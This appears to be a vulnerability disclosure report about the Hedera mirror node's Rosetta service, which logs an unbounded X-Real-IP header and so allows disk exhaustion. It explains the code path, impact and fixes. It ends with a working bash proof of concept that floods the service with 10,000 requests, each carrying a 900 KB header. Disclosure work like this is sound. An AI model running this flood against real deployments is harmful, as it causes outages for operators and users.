### Title
Unbounded `X-Real-IP` Header Value Logged Without Length Validation Enables Disk-Exhaustion DoS

### Summary
`getClientIpAddress()` in `rosetta/app/middleware/trace.go` reads the `X-Real-IP` header and returns it without any length or format validation. The returned value is directly interpolated into every log line by `TracingMiddleware`. Because Go's `net/http` server defaults to a 1 MB total header budget and the `http.Server` in `rosetta/main.go` sets no explicit `MaxHeaderBytes`, an attacker who can reach the Rosetta service directly can craft requests whose log entries are each up to ~1 MB, rapidly exhausting disk space.

### Finding Description
**Exact code path:**

`rosetta/app/middleware/trace.go`, `getClientIpAddress()` (lines 63–74):
```go
func getClientIpAddress(r *http.Request) string {
    ipAddress := r.Header.Get(xRealIpHeader)   // line 64 – no length cap
    if len(ipAddress) == 0 {                    // line 66 – only guards empty
        ipAddress = r.Header.Get(xForwardedForHeader)
    }
    if len(ipAddress) == 0 {
        ipAddress, _, _ = net.SplitHostPort(r.RemoteAddr)
    }
    return ipAddress                            // returns raw, unbounded string
}
```

`TracingMiddleware` (lines 52–53) then embeds the value verbatim:
```go
message := fmt.Sprintf("%s %s %s (%d) in %s",
    clientIpAddress, request.Method, path, ...)
```
followed by `log.Info(message)` (line 58), which writes the full string to the log sink.

**Root cause:** The only guard is `len(ipAddress) == 0`, which is a presence check, not a size bound. Any non-empty value — including a ~1 MB string — passes straight through and is written to every log entry.

**HTTP-layer constraint:** `rosetta/main.go` (lines 220–227) constructs the `http.Server` without setting `MaxHeaderBytes`:
```go
httpServer := &http.Server{
    Addr:              ...,
    Handler:           corsMiddleware,
    IdleTimeout:       ...,
    ReadHeaderTimeout: ...,
    ReadTimeout:       ...,
    WriteTimeout:      ...,
    // MaxHeaderBytes not set → defaults to http.DefaultMaxHeaderBytes = 1 << 20 (1 MB)
}
```
Go's default `http.DefaultMaxHeaderBytes` is 1,048,576 bytes. A single `X-Real-IP` value can therefore be up to ~1 MB (minus other header overhead) before the server rejects the request with 431.

**Nginx mitigation — and why it is insufficient:** The Docker Compose nginx config (`docker-compose.yml`, line 204) does `proxy_set_header X-Real-IP $$remote_addr`, which overwrites the header with the real remote address. However:
- The Rosetta container listens directly on port 5700; if that port is reachable (e.g., exposed in Kubernetes, a misconfigured firewall, or a standalone deployment), nginx is bypassed entirely.
- Non-Docker deployments (bare-metal, custom Kubernetes Ingress, etc.) may not replicate this override.
- The nginx proxy is described as optional and disabled by default for the Rosetta service.

### Impact Explanation
Each HTTP request with a ~1 MB `X-Real-IP` header produces a ~1 MB log line. At a modest 100 req/s (easily achievable from a single host), the log sink receives ~100 MB/s. A typical 100 GB disk is exhausted in under 20 minutes. Once disk space is gone, the Rosetta node stops logging, may fail to write other critical data, and can crash or become unresponsive — constituting a full availability loss for the Rosetta API endpoint. Because Rosetta is used for exchange integrations on networks with ≥25 % market cap, this directly impacts asset custody and exchange operations.

### Likelihood Explanation
The precondition is network reachability to port 5700 on the Rosetta container. This is realistic in:
- Any standalone deployment not behind a hardened reverse proxy.
- Kubernetes deployments where the service is exposed via a LoadBalancer or NodePort without an Ingress that strips/rewrites `X-Real-IP`.
- Any environment where the operator follows the documented standalone Docker run command (`docker run … -p 5700:5700 hedera-mirror-rosetta:…`).

No authentication, credentials, or special privileges are required. The attack is trivially scriptable with `curl` or any HTTP client and is fully repeatable.

### Recommendation
1. **Truncate or validate the header value** in `getClientIpAddress()` before returning it:
   ```go
   const maxIPLength = 45 // max IPv6 length
   if len(ipAddress) > maxIPLength {
       ipAddress = ipAddress[:maxIPLength] // or return a placeholder
   }
   ```
2. **Set an explicit `MaxHeaderBytes`** on the `http.Server` in `rosetta/main.go` to a value well below 1 MB (e.g., 8 KB is sufficient for normal API use).
3. **Validate that the returned string is a valid IP address** using `net.ParseIP` before embedding it in the log message; fall back to `"invalid"` or `r.RemoteAddr` on failure.
4. **Restrict port 5700** at the network/firewall level so it is only reachable through the trusted reverse proxy.

### Proof of Concept
**Precondition:** Rosetta service reachable directly on port 5700 (no nginx in front, or nginx bypassed).

```bash
# Generate a ~900 KB payload for the X-Real-IP header
PAYLOAD=$(python3 -c "print('A' * 900000)")

# Send a single request; observe ~900 KB written to the log
curl -s -o /dev/null \
  -H "X-Real-IP: ${PAYLOAD}" \
  http://<rosetta-host>:5700/network/list \
  -X POST -H "Content-Type: application/json" \
  -d '{"metadata":{}}'

# Flood to exhaust disk (adjust rate as needed)
for i in $(seq 1 10000); do
  curl -s -o /dev/null \
    -H "X-Real-IP: ${PAYLOAD}" \
    http://<rosetta-host>:5700/network/list \
    -X POST -H "Content-Type: application/json" \
    -d '{"metadata":{}}' &
done
wait
```
